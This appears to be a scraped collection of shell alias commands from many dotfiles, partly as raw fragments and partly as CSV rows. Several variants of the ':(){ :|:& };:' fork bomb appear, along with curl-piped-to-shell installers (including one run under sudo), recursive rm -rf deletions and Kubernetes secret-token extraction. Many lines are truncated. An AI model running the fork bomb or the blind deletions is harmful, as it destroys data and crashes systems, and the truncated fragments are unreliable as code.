_() { f -type f | grep $*; }; _
_() { f -type d | grep $*; }; _
_() { code-insiders --list-extensions | xargs -L 1 echo code-insiders --install-extension }; _
_ ps aux | sort -k3
_ ps aux | egrep
_ lsof -i | grep LISTEN
][^=]*\)='\''\(.*\)'\''/\1 \2/' |
]+)=’(\”[^\”]+\”|[^ ]+)(( +[^ ]+)*)’”
]*\)=.*/\1/') | sort -u > compgen.out
]*)=(.)(.*)\2/\1 \3/' |\
\xrandr | egrep \
\xev | \grep -E --color -C1 -i
\vim --help -u NONE -U NONE | less
\uuidgen | tr [:upper:] [:lower:]
\tree -n | less
\tree --dirsfirst -C | less -r
\system_profiler SPSoftwareDataType;\system_profiler SPInstallHistoryDataType | \grep Install.macOS
\sudo apt autoremove -y --purge ; dpkg --list |grep \
\rm out.mp4; cat *.jpg | avconv -f image2pipe -r 10 -c:v mjpeg -i - -map 0 -c:v mpeg4 -r 20 -pix_fmt yuv420p -qscale 1 out.mp4
\pwd | sed -E s#/+#/#g
\ps auxf | sort -nr -k 4
\ps auxf | sort -nr -k 3
\ps aux --sort -rss | head -n5
\ps aux --sort -rss | \less
\ps -fp \$(\xprop _NET_WM_PID | awk -F'=' '/_NET_WM_PID/{print\$NF}')
\ps -ef|grep --color
\ps -ef | grep --color=always
\ps -ef | grep
\ps -eF --headers | less
\pacman -Q|grep
\pacman -Ql|grep
\networksetup -getmacaddress \$wifiInterface | awk '{print\$3}'
\mount | column -t
\lspci | awk '/ISA bridge/{print \
\ls | tr '\n' '\0'
\ls | pv -qL 10
\ls | more
\ls | grep
\ls | column -c
\ls /var/log/packages | grep $1
\ls -t | head -n 1
\ls -t /tmp/aerospike-console.* | head -1
\ls -pl --color | grep
\ls -lag !* | \more
\ls -lAh | grep
\ls -lAh | ag
\ls -l | \grep ^d
\ls -d */ | xargs -i -n1 rm -rf {}
\ls -alF | grep ^d
\ls -al | more
\ls -R | grep
\ls -GAlhtFr | tail
\ls -FhNv --color=auto | less
\ls -FC --color |more
\ls -F | grep / >> .01.txt && column -x .01.txt && rm -f 01.txt
\ls -F | grep -v / >> .01.txt && column -x .01.txt && rm -f 01.txt
\ls -F --color=always | \less -r
\ls -A|wc -w
\ls -Al |wc -l
\ls -Al | grep --color=never '^d'
\ls -AhltF | head
\ls -AFhNv --color=auto | less
\ls -1 | wc -l
\ls -1 --color=auto|grep '(^\w*[^_-])'
\last | less
\ip -j link show | jq -r '.[].ifname'
\ip -c -o -d -s link show | column -t
\ifconfig $wifiInterface | awk '/HWaddr/{print\$1\
\history | sed \$d
\history | grep --color=auto
\history | \grep $*
\history 0 | grep
\git status | grcat conf.gitstatus
\git ls-remote --tags https://github.com/rg3/youtube-dl | awk -F/
\git config remote.origin.url | \awk '/github.com/{print\
\git config -l | awk -F= /^remote.*\.url=/{print\$2}
\free -m | awk '/^Swap/{print 100*\$3/\$2}'
\env | sort
\eix -cI | less
\du -s err.txt generated.file succ.txt | sort -n ; du -s .
\du -s err.txt generated.file succ.txt | sort -n
\du -ha --max-depth=1 | sort -hr
\du -h | less
\du -h --max-depth=1 | sort -hr
\du -ah . | grep -v
\du $dusargs | sort -nr
\dirs -p | awk '{print NR-1 \
\dirs -l -v | tac
\df | grep -q \$CDR_DEVICE && umount -vv \$CDR_DEVICE ; \cdrdao
\df | grep -q $CDR_DEVICE && umount -vv $CDR_DEVICE ; \cdrdao
\df | grep -q $CDR_DEVICE && umount $CDR_DEVICE ; \cdrdao
\df -hP | column -t
\df -h -P | column -t
\deborphan | sort
\date --iso-8601=seconds | sed 's/:/./g'
\curl -sSL https://raw.githubusercontent.com/taylor/kiex/master/install | bash -s
\curl -sSL https://get.rvm.io | bash -s stable --ruby
\curl -L https://get.rvm.io | bash -s stable
\curl --silent https://ifconfig.co/json | jq .
\brew outdated;yes N | \brew cu -aq;echo
\apt list --upgradable 2>/dev/null | awk -F/ '/security/{packages=packages\
\`pwd | cut -d/ -f 1-5\`/tools/current/bin/omegacmd.py
\`pwd | cut -d/ -f 1-4\`/tools/current/bin/omegacmd.py
\`docker ps --format '{{.Names}}' | peco\`
\\cat ~/.ssh/config | grep \
\'xgterm -bg \\\#1E2022 -fg \\\#d0d0d0 -cr \\\#e0e0e0 -title IRAF -fn 12x24 -e cl\' | sudo tee /etc/profile.d/run-iraf.sh
\'wc -l /usr/share/wordlists/* \| sort -rn\' >> $strBashrc
\'tmux -2\' | tee -a ~/.bashrc
\'tmux -2\' | sudo tee -a $HOME/.bashrc
\'git tag \| grep latest\' >> ~/.bashrc
\${HOME}/.scripts/openconnect.exp &\| tail -a \${HOME}/.logs/openconnect
\$(route -n get default -ifscope en0 | awk '/gateway/ { print \$2 }')
\$(compgen -c | fzf --height=10 --border --margin=1)
\!* | tee \!:1.log
[[ -x `which xclip 2>/dev/null` ]] && cat << EOF | xclip -selection clipboard
[[ $(git rev-parse --abbrev-ref HEAD) == master ]] && git branch --no-merged | xargs -p git branch -D
[[ $(apt-mark showmanual | egrep
[ $(docker ps -aq | wc -l) -ne 0 ] && docker stop $(docker ps -aq)
[ $(docker ps -aq | wc -l) -ne 0 ] && docker rm $(docker ps -aq)
WIN_IDs=$(wmctrl -l | awk '$3 !=
VISUAL='vim -c '\''set syntax=html | set encoding=utf8'\''' xsh
VBoxManage showvminfo l32 | grep -i state
VBoxManage showvminfo centos | grep State
VBoxManage showvminfo Windows | grep 'State'
VBoxManage list vms | grep
VBoxManage list vms --long | grep -e \
VBoxManage list runningvms | awk -F'\
VBoxManage list -ls vms | less
VBoxManage list -l vms | grep -i \
VBoxManage controlvm <name|uuid> poweroff
USER_TOKEN=\$(kubectl get secret ""\${SECRET_NAME}"" -n default -o jsonpath=""{.data.token}"" | base64 -d)
UI.Color.IsAvailable && test -z \${NO_UNICODE-} && (echo -e $'\u1F3B7' | grep -v F3B7) &> /dev/null
UI.Color.IsAvailable && test -z \$NO_UNICODE && (echo -e $'\u1F3B7' | grep -v F3B7) &> /dev/null
TZ='Europe/Prague' date --iso-8601=seconds | sed 's/^/-- /; s/T/ /; s/+.*//'
TWO | xargs -n1 kill
TF_CMD=$(TF_ALIAS=pls PYTHONIOENCODING=utf-8 TF_SHELL_ALIASES=$(alias) thefuck $(fc -ln -1 | tail -n 1)) && eval $TF_CMD && print -s $TF_CMD
TF_CMD=$(TF_ALIAS=oops PYTHONIOENCODING=utf-8 TF_SHELL_ALIASES=$(alias) thefuck $(fc -ln -1 | tail -n 1)) && eval $TF_CMD && print -s $TF_CMD
TF_CMD=$(TF_ALIAS=fuck PYTHONIOENCODING=utf-8 TF_SHELL_ALIASES=$(alias) thefuck $(fc -ln -1 | tail -n 1)) && eval $TF_CMD && print -s $TF_CMD
TERMINFO=$terminfo_dir/ $(type -P nvim | head -1)
ShowNightJobLogfile | less -E
ShowAllNightJobLogFilesErrors | more
ShowAllNightJobLogFiles | more
SIMP_BUILD_docs=no bundle exec rake beaker:suites[rpm_docker] |& tee /tmp/isobuildoutput
SAME_ALIASES_COUNT=$(echo $SAME_ALIASES | wc -w)
S tail -f /var/log/syslog | $colorizer
S tail -f /var/log/maillog | $colorizer
S tail -f /var/log/daemon.log | $colorizer
RAILS_ENV=test bundle exec parallel_test spec --type rspec -n 4 --suffix '_spec.rb|.feature'
RAILS_ENV=test be parallel_test spec --type rspec -n 2 --suffix '_spec.rb|.feature'
Pt -l '<<<' | xargs -o vim -O
Passgen -d | pbcopy; ((sleep $CLEAR_CLIP; cl) &)
Passgen -d -b | pbcopy; ((sleep $CLEAR_CLIP; cl) &)
PYTHONPATH=`pwd`/.. ../.virtualenv/bin/pytest $1 -x |& color
PYTHONIOENCODING=utf-8 eval $(thefuck $(fc -ln -1 | tail -n 1)); fc -R
PW=$PWD;ww; git show HEAD | ./scripts/checkpatch.pl -;cd $PW
PS1='\u $(hostname | tr '[A-Z]' '[a-z]') \w >> '
PROJ=$(echo $TARGET_PRODUCT | sed
PROFILE_INIT=true zsh -il -c exit | less
PREVPROMPT=$( readlink .my-oh-my-zsh/dave.custom | cut -d
PR=`git pull-request`; echo $PR; echo $PR|pbcopy
PGPASSWORD=odoo psql -h localhost -p $(docker-compose port db 5432 | cut -d : -f 2) -U odoo prod
PGPASSWORD=odoo psql -h localhost -p $(docker-compose port db 5432 | cut -d : -f 2) -U odoo odoodb
PGPASSWORD=odoo psql -h localhost -p $(docker-compose port db 5432 | cut -d
PATH=`echo $PATH | upath.sh`
PASSWORD=$(pass email/brice.wge@gmail.com | sed -n
PAGER='grcat ~/.grcat | less -iMSx4FXRe' pgcli
PAGER='grcat ~/.grc/colourfiles/conf.psql | less -iMSx4FXRe' pgcli
PAGER='diff-so-fancy | less --tabs=4 -RFX' git diff
OutputTermTitle clock; perl -e '\$SIG{INT} = sub { print qq{\\n}; exit(0) };$| = 1; while(1) { print qq{\\r}; print q{ } for(1..30); print qq{\\r} . scalar(localtime());sleep(1)}'
OPTIONS=$(ls -aF |grep /$) ; select s in $OPTIONS; do cd $PWD/$s ; break ; done
OPTIONS=$(ls -F |grep /$) ; select s in $OPTIONS; do cd $PWD/$s ; break ; done
OPTIONS=$(\ls -F | grep /$); select s in $OPTIONS; do cd $PWD/$s; break;done
OPTIONS=$(\ls -F | grep /$); select s in $OPTIONS; do cd $PWD/$s; break; done
NODE_ENV='demo' LOCAL_AUTH=true node --inspect ./node_modules/ui-zephyr/src/bin/zephyr-transpile | bunyan
NOCOLOR | vim -R -
NIXPKGS_ALLOW_UNFREE=1 nix-env -qaP | grep -i
LS -tr | tail -1
LINE=$(rake -T |awk
LF | xargs xdg-open
LESSOPEN='|src-hilite-lesspipe.sh %s' less
LESSOPEN='|/usr/bin/lesspipe %s' less
LESSOPEN='| src-hilite-lesspipe.sh %s\' less -sNRij10 +F
LESSOPEN='| src-hilite-lesspipe.sh %s\' less -sNRi
LESSOPEN='| source-highlight --outlang-def=esc256.outlang --style-file=esc256.style -i \
LESSOPEN='| /usr/bin/src-hilite-lesspipe.sh %s' less -M
LESS=-RX; tree | less
LESS='-R' LESSOPEN='|~/.oh-my-zsh/custom/local/pyless %s' less
LC_CTYPE=C tr -dc [:graph:] < /dev/urandom | head -c 128 && echo ''
LC_CTYPE=C tr -dc [:alnum:] < /dev/urandom | head -c 128 && echo ''
LC_COLLATE=C ls -t | sed q
LC_ALL=C; cat /dev/urandom | tr -dc
LC_ALL=C tr -dc a-zA-Z0-9 < /dev/urandom | head -c 20; echo
LC_ALL=C tr -dc A-Za-z0-9_ < /dev/urandom | head -c $1
LC_ALL=C tr -dc A-Za-z0-9 < /dev/urandom | head -c
LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 24 ; echo
LC_ALL=C rcs2log -R -v -h \${HOSTNAME} | fmt > ChangeLog
LC_ALL=C rcs2log -R -v -h ${HOSTNAME} | fmt > ChangeLog
LC_ALL=C pacman -Qtim | filter_pacman_qt
LC_ALL=C pacman -Qti | filter_pacman_qt
LC_ALL=C mka bacon 2>&1 | tee build.log
LC_ALL=C ls -lAh | less -r -E -X
LC_ALL=C < /dev/urandom tr -dc .$_A-Z-a-z-0-9 | head -c12; echo
LANG=c ifconfig | grep -B1 \
LANG=c < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;
LANG=C tr -cd '[:alnum:]' < /dev/random | head -c 20
LANG=C pacman -Sl | awk '/\[installed\]$/ {print $2}' > ~/.pkglist.txt
LANG=C pacman -Qi | awk
L | less -R
L | grp
Ifconfig en1 | grep ether
ININ_TRACING=/home/mark/data/inin_tracing GTK2_RC_FILES=/usr/share/themes/Adwaita/gtk-2.0/gtkrc LD_LIBRARY_PATH=/usr/lib64/:/home/mark/data/builds/core_main_systest/pub/gen/bin/l64:/home/mark/data/builds/system_main_systest/pub/gen/bin/l64/:/home/mark/data/builds/ininbuild_main_systest/pub/gen/bin/l64/ mono $(ls --color=never /home/mark/data/builds/core_main_systest/pub/gen/bin/l64/ininlogviewer-l64d-*.exe |tail -n1) 2>&1 >/dev/null &
INFO echo '### Available Functions (.bashrc) ###' > /dev/tty; CMDINFO echo -n > /dev/tty; cat ~/bash/.bashrc | grep function; echo -n > /dev/tty; INFO echo '### Aliases (.bashrc) ###' > /dev/tty; CMDINFO alias; NORMAL
HISTTIMEFORMAT= history | $HOME/.local/bin/history.py
HI | less -R
HELLO| cowsay
HASTE_SERVER='http://drop1.shabren.com:7777' haste | pbcopy
GitLogFunc | less -R
G_SLICE=always-malloc G_DEBUG=gc-friendly valgrind --tool=memcheck --num-callers=50 --leak-check=full --track-origins=yes --xml=yes --log-file=unity-valgrind.20120409T160245.xml compiz --replace 2>&1 | tee ~/unity-valgrind.20120409T160245.log
FLEX '%1 --help | less'
FLEX ' %1 | xsel -b '
F | xargs open
ERROR=0 ; git config -l | grep -q core.repositoryformatversion ; if [ \$? -eq 0 ]; then pull; push ; else DIR=$PWD ; echo -en '\n\t $alert Starting rr(all) $normal \n\n' ; cloneall ; cds; echo -en '\t $yellow $alert $> rr (CDSHELL) $normal\n' ; pull ; push ; cdww ; echo -en '\t$yellow $alert $> rr (WORKSPACE) $normal\n' ; pull; push; cdh; echo -en '\t$yellow $alert $> rr (HELP) $normal\n' ; pull; push; cdc; echo -en '\t $yellow $alert $> rr (CODIGO-FONTE) $normal\n' ; pull; push ; cd $DIR ; fi; if [ $? == 0 ]; then echo -en '\n\n\t $green $alert Sucesso: rr (all) $normal \n\n' ; else echo -en '\n\n$redalert (X) Erro - Houve algum erro durante o rr(all) $normal\n\n'; fi
EO | less
EO | grep
E | less
E | diff L
E | colordiff L
DISPLAY=:0 xdotool key --window $(ps -aux | sed -n
DISPLAY=${DISPLAY} i3-dump-log | less
DISABLE_COLOR_LOGGING=true deptree|gvim -R - &
DIR=${PWD##*/}; rm -rf ../${DIR}.backup; cp -R ../${DIR} ../${DIR}.backup; ls ../ | grep ${DIR}
DEST=`find -type d | fzf` ; cd $DEST
DB2Alias|sort
CURRENT_HASH=$(git rev-parse HEAD | cut -c1-8)
CLICOLOR_FORCE=yes ls -oFGht | head
CLICOLOR_FORCE=true ls | prettyprint.awk
CLICOLOR_FORCE=true ls $LS_OPTIONS -lhF|grep /
CLICOLOR_FORCE=true ls $LS_OPTIONS -lhF|grep -v /
CLICOLOR_FORCE=true ls $LS_OPTIONS -alh|sort
CLICOLOR_FORCE=true ls $LS_OPTIONS -alhF|less
CLICOLOR_FORCE=true ll | prettyprint.awk
CLICOLOR_FORCE=true ll | less -R
CLICOLOR_FORCE=true lal | less -R
CLICOLOR_FORCE=true la | prettyprint.awk
CLICOLOR_FORCE=1 ls | less -R
CLICOLOR_FORCE=1 ls -p | grep --color=never '/$'
CLICOLOR_FORCE=1 ls -lruh | less -R --clear-screen --quit-if-one-screen
CLICOLOR_FORCE=1 ls -lh | less -R --clear-screen --quit-if-one-screen
CLICOLOR_FORCE=1 ls -lh $1 $2 $3 $4 $5 $6 $7 $8 $9 | less -ieFX
CLICOLOR_FORCE=1 ls -lahF ${ls_colorflag} | less -R
CLICOLOR_FORCE=1 ls -lah $1 $2 $3 $4 $5 $6 $7 $8 $9 | less -ieFX
CLICOLOR_FORCE=1 ls -laG | less -R
CLICOLOR_FORCE=1 ls -lAh | less -R --clear-screen --quit-if-one-screen
CLICOLOR_FORCE=1 ls -alG | less -R
CLICOLOR_FORCE=1 ls -AlS | grep -v /$
CLICOLOR_FORCE=1 ls -AGlF | more -R
CLICOLOR_FORCE=1 ls -AGFlh | __short_ls_print
CLICOLOR_FORCE=1 ll -G | less -R
CLICOLOR_FORCE= ls -lGFhAo | less -INSR
CLICOLOR_FORCE= ll | less -R
CLASSPATH=\$(mvn dependency:build-classpath | grep -v '^\[.*')
CLASSPATH=$(echo $CLASSPATH | sed 's/:\([^:]*imas[^:]*\):/:/g'); fsc -shutdown
CI=1 unbuffer pytest --no-cov --junit-xml='' --disable-pytest-warnings | sed 's/WARNING: Coverage disabled via --no-cov switch!//'
CHROME_LOG_FILE=chrome.log /Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log
CHROME_LOG_FILE=chrome.log /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log
CHROME_LOG_FILE=chrome.log /Applications/Google\ Chrome.app/Concd outtents/MacOS/Google\ Chrome --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log
CHROME_LOG_FILE=chrome.log /Applications/Chromium.app/Contents/MacOS/Chromium --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log
CA_CRT=\$(kubectl -n default get secret ""\${SECRET_NAME}"" -o go-template=""{{index .data \""ca.crt\""}}"" | base64 -d)
BLOCKSIZE=1048576; du -chx | sort -rh
Ag . | FZF --exact
AWS_PROFILE=services aws ecr get-login --no-include-email | bash
ANSIBLE_CONFIG=~/projects/osx-bootstrapping/ansible.cfg ansible-playbook --vault-password-file ~/projects/osx-bootstrapping/vault_from_gpg_agent.py -i ~/projects/osx-bootstrapping/dotfiles/inventory ~/projects/osx-bootstrapping/dotfiles/osx.yml | ~/projects/osx-bootstrapping/sanitize_output.awk
@graphproc | less
@allproc | less
?not(?or(~n`uname -r | cut -d"
>|/dev/null
>| /tmp/diff.diff
>/dev/null 2>&1 _z $(z | fzf)
>& /dev/null &|
> ~/.config/pianobar/custom-out ; clear ; pianobar | tee ~/.config/pianobar/custom-out
> ~/.config/pianobar/custom-out ; clear ; pianobar 2>/dev/null | tee ~/.config/pianobar/custom-out
> lloogg;clear;make run 2>&1 | tee -a lloogg;
> /dev/null 2>&1 &|
=ls | pv -qL 10
=ls -rtlh -- *(.) | tail $@ 2&>/dev/null
=ls -rtl -- *(.) | head $@ 2&>/dev/null
=ls -Sl -- *(.) | tail $@ 2&>/dev/null
=ls -Gdl ^(*~|*.pyc)
=ls -Gd ^(*~|*.pyc)
</dev/urandom tr -dc A-Za-z0-9 | head -c 10
</dev/urandom tr -dc '12345!@#$%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c12; echo \
</dev/urandom tr -dc '12345!@#$%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c10; echo \
</dev/urandom LANG=C tr -dc [:graph:] | head -c$1
</dev/urandom LANG=C tr -dc A-Za-z0-9 | head -c$1
<(pacman -Qqg base base-devel | sort)"
<(pacaur -Sqg base base-devel | sort) \
< /dev/urandom tr -dc ~@#$^%A-Za-z0-9 | head -c${1:-32}
< /dev/urandom tr -dc _A-z-a-z-0-9 | head -c16 && echo ''
< /dev/urandom tr -dc _A-Z-a-z-0-9=% | head -c${1:-16};echo;'
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c8
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c16;echo
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-32};echo;
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo
< /dev/urandom tr -dc [:graph:] | head -c12; echo
< /dev/urandom tr -dc [:graph:] | head -c 40; echo;
< /dev/urandom tr -dc [:alnum:] | head -c 40; echo;
< /dev/urandom tr -dc A-Za-z0-9_ | head -c8
< /dev/urandom tr -dc A-Za-z0-9_ | head -c21
< /dev/urandom tr -dc A-Za-z0-9_ | head -c15
< /dev/urandom tr -dc A-Za-z0-9 | head -c${1:-8};echo;
< /dev/urandom tr -dc A-Za-z0-9 | head -c${1:-22};echo;
< /dev/urandom tr -dc A-Z-a-z-0-9 | head -c${1:-32};echo;
< /dev/urandom tr -dc 'A-Za-z0-9\\?!=-_' | head -c13
:(){:|:&};:
:(){ :|:& };:
:(){ :|:& }:
:(){ :|: & };:
:(){ :|: & }:;
:() { :|:& };:
:() { :|:& } ;:
:() { :|: & };:
: | openssl s_client -showcerts -connect
953068,221160,cget,curl -s https://getcomposer.org/installer | php"""
910672,215681,git-prune-local,git branch --merged | \"
904617,214167,deb-kclean,sudo aptitude remove -P """"?and(~i~nlinux-(ima|hea) ?not(~n`uname -r`))"""""""
883585,210451,c+,if [[ `wc -l ~/.aliases_pwd_swap | cut -d """" """" -f 1` -ne 0 ]];\"
880967,209967,lm,ll |more"""
840781,202383,localips,ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'"""
7z e -so ~/notes/personal.7z |less
78861,39015,adb_screenshot,adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g'"""
760188,186742,xstatus,ps aux | grep nginx"""
757892,186212,check_ssh,ps aux | grep ssh"""
701873,174412,parse_git_branch,git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1/'"""
666498,166219,${1},\'$(echo """"${2}"""" | sed """"s:':'\\\\'':"""")\'"""
598180,153452,path,echo $PATH | tr : """"\n"""""""
527301,144021,gtl,clear && git tree --color=always | less -R"""
525818,143367,pf,ps -e | grep $1"""
4783953,908679,nuke,docker ps -q -a | xargs docker rm -f"""
4770777,904485,clipdir,pwd | pbcopy"""
4770769,904484,gpg-agent-interrupt,pgrep gpg-agent |"
4770767,904484,gpg-agent-flush,pgrep gpg-agent |"
4724957,894964,hs,history | grep $1"""
4706643,890384,d,dirs -v | head -10"""
4667671,879580,lll,ls -lA | less"""
4622677,866824,netstat,ss -pantu | column -t"""
4520871,754557,git-tasks, grep --exclude-dir=.git -rEI """"TODO|FIXME"""" . 2>/dev/null """
4513034,749377,git_tasks, grep --exclude-dir=.git -rEI """"TODO|FIXME"""" . 2>/dev/null """
4512798,749376,git_tasks, grep --exclude-dir=.git -rEI """"TODO|FIXME"""" . 2>/dev/null """
4511054,748815,bt,echo 0 | gdb -batch-silent -ex """"run"""" -ex """"set logging overwrite on"""" -ex """"set logging file gdb.bt"""" -ex """"set logging on"""" -ex """"set pagination off"""" -ex """"handle SIG33 pass nostop noprint"""" -ex """"echo backtrace:\n"""" -ex """"backtrace full"""" -ex """"echo \n\nregisters:\n"""" -ex """"info registers"""" -ex """"echo \n\ncurrent instructions:\n"""" -ex """"x/16i \$pc"""" -ex """"echo \n\nthreads backtrace:\n"""" -ex """"thread apply all backtrace"""" -ex """"set logging off"""" -ex """"quit"""" --args"""
4503830,746618,rm, $ROOT_SHELL_FILE|head -1`"
4496154,738693,bt,echo 0 | gdb -batch-silent -ex """"run"""" -ex """"set logging overwrite on"""" -ex """"set logging file gdb.bt"""" -ex """"set logging on"""" -ex """"set pagination off"""" -ex """"handle SIG33 pass nostop noprint"""" -ex """"echo backtrace:\n"""" -ex """"backtrace full"""" -ex """"echo \n\nregisters:\n"""" -ex """"info registers"""" -ex """"echo \n\ncurrent instructions:\n"""" -ex """"x/16i \$pc"""" -ex """"echo \n\nthreads backtrace:\n"""" -ex """"thread apply all backtrace"""" -ex """"set logging off"""" -ex """"quit"""" --args"""
4494095,737953,bt,echo 0 | gdb -batch-silent -ex """"run"""" -ex """"set logging overwrite on"""" -ex """"set logging file gdb.bt"""" -ex """"set logging on"""" -ex """"set pagination off"""" -ex """"handle SIG33 pass nostop noprint"""" -ex """"echo backtrace:\n"""" -ex """"backtrace full"""" -ex """"echo \n\nregisters:\n"""" -ex """"info registers"""" -ex """"echo \n\ncurrent instructions:\n"""" -ex """"x/16i \$pc"""" -ex """"echo \n\nthreads backtrace:\n"""" -ex """"thread apply all backtrace"""" -ex """"set logging off"""" -ex """"quit"""" --args"""
4483084,734303,normalise,trrr """"{upper}{sc}"""" """"{nm_u}"""" | trrr """"{lower}"""" """"{nm_l}"""""""
4482837,734294,typescript,find . -name """"*.ts"""" | xargs tsc -w"""
4472536,731281,L,| less"""
4458941,723740,hist,history | grep $1"""
4454378,722711,a2buddy,curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | sudo perl"""
4454372,722707,phpunit, ~/.zshrc | wc -l` -eq """"0"""" ]"
4431112,715209,hg,history | grep"""
4430970,715191,L,|$PAGER
4426013,714328,temps,( date && sensors && lsmod|grep -q fglrx && ( "
4417029,713259,check_data,csvtool readable data.csv | view -"""
4401423,710389,lm,ls -alh |more"""
4385636,708497,hgrep,history | grep"""
4368643,704854,pbcopy,xclip -i -selection clipboard -f |xclip -i -selection primary"""
4357344,702548,hgrep,history | grep"""
4357291,702545,hgrep,history | grep"""
4356717,701824,zsh_history_clean,sort -t """";"""" -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history"""
4300630,693907,scandisk,clamscan --recursive --infected --exclude-dir='^/sys|^/dev' /"""
4299392,693797,fly,gradle -b standalone.gradle flywayRepair ; gradle -b standalone.gradle flywayMigrate -i | /usr/bin/ts """"%H:%M:%.S"""""""
4298801,693677,lsockT,sudo /usr/sbin/lsof -nP | grep TCP"""
4297545,693136,specification/, $origFile | head -n 1`"
4297543,693134,specification/, $origFile | head -n 1`"
4297200,692960,unpm,find . -type d -name node_modules -prune -print0 | xargs -0 rm -rf --"""
4279191,689532,flushmcd,echo """"flush_all"""" | nc 10.10.27.11 11211"""
4278515,689145,lach,la -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1"
4272289,687150,last.tw.report,echo $(ls -t /var/lib/tripwire/report/* | head -1)"""
4271827,686874,which,alias | which -i"""
4234768,678581,alg,alias | grep"""
4219430,675576,dpi,xdpyinfo | grep resolution"""
4217416,675367,M,| more"""
4200735,669825,ant.local_lib,ant $(find ../*/dist -name *.jar | sed """"s:.*:-lib &:"""")"""
4169123,663726,fa,alias | grep $1"""
4146110,658138,hglc,hg log -l 1 | \"
4146108,658138,hgbs,hg branches | \"
4121717,652164,gdi,git status --porcelain --short --ignored | sed -n """"s/^!! //p"""""""
4108077,650422,copy-ssh-auth-sock,echo -n $SSH_AUTH_SOCK | pbcopy"""
4105801,649415,gdi,git status --porcelain --short --ignored | sed -n """"s/^!! //p"""""""
4104970,649136,pyclean,find . -type f -name """"*.py[co]"""" -exec rm -r \{\} \; && find . -type d -name """"__pycache__"""" | xargs rm -rf && echo """"Removed pycs and __pycache__"""""""
4051665,641008,ro-files,find -type f -print0 |"
4029136,636381,ro-files,find -type f -print0 |"
4009111,633954,lsg,ls --color=auto | grep"""
40'ls -ltr|tail -40'
3976302,626907,data-taiwan-county-code,curl --silent https://www.ris.gov.tw/documents/data/5/1/RSCD0101.txt | iconv -f BIG-5 -t UTF-8 -"""
3874197,608032,email_me,echo """"Your build on machine """"$HOSTNAME:$PWD """"done"""" | sudo sendemail -f agrawals@quicinc.com -t agrawals@quicinc.com -u """"BUILDY: $HOSTNAME $PWD done"""""""
3869804,606328,gcob,git checkout $(git branch | fzf)"""
3860610,604356,psg,ps aux | grep """
3860452,604222,hg,history | grep"""
3789853,592601,pipudate,sudo pip freeze --local | sudo grep -v """
3767351,591963,lsd,ls -l | grep ^d"""
3741907,587461,O,| xargs open"""
3741305,587434,f,find |grep"""
3741204,587431,pgrep,ps aux | grep """
3740572,587412,gs,git -c color.ui=always status | less -REX"""
3740292,587406,dnfi,dnf list installed | less"""
3738811,587361,dsa,du -h --all --max-depth=1 --one-file-system 2> /dev/null | sort -h"""
3738266,587345,L,| less"""
3731567,587134,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3731255,587123,pr,aptitude search $1 -F %p|xargs sudo aptitude remove"""
3727379,587018,imagefind,find . -name """"*"""" -exec file {} \; | /usr/bin/grep -o -P """"^.+: \w+ image"""""""
3671190,584840,notify, '| tee terminal-notifier'"""
3671118,584834,hgrep,history | grep"""
3670880,584825,phpext,php -i | grep extension_dir"""
3670464,584811,dipt,sudo iptables -vnL | env grep docker -i -C 20 --color"""
3670151,584800,L,| less"""
3669753,584784,myDefaults,history | grep """"defaults write"""""""
3669304,584769,hi,history | tail -20"""
3668652,584742,G,| grep"""
3668334,584733,sa,alias | grep -i"""
3668039,584726,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3662149,584552,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3660840,584520,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3660195,584503,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3659485,584480,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3658590,584448,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3658315,584441,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3657319,584414,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3653572,584295,hb,sudo ps -aef | grep HandBrakeCLI"""
3653387,584285,L,| less"""
3651020,584077,chromium,CHROME_LOG_FILE=chrome.log /Applications/Chromium.app/Contents/MacOS/Chromium --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log"""
3650855,584068,chromium,CHROME_LOG_FILE=chrome.log /Applications/Chromium.app/Contents/MacOS/Chromium --args --enable-usermedia-screen-capturing --usermedia-screen-capturing --enable-logging --v=1 --vmodule=*source*/talk/*=5 2>&1 | tee console.log"""
3647677,583907,l.,ls -A | egrep '^\.'"""
3646247,583830,sa,alias | grep -i"""
3645436,583791,sa,alias | grep -i"""
3644392,583760,fj,jira open \$(jira i | fzf)"""
3642618,583674,lm,ls -al |more"""
3641428,583614,pubkey,pbcopy < ~/.ssh/id_rsa.pub | echo '-- Public key copied to pasteboard! -- '"""
3638280,583498,haxmstat,kextstat | grep intel"""
3633037,583337,quota,echo """""""" ; df -h ~ | sed /""""export""""/d ; echo """""""""""
3632285,583312,jc,ps -ef | grep"""
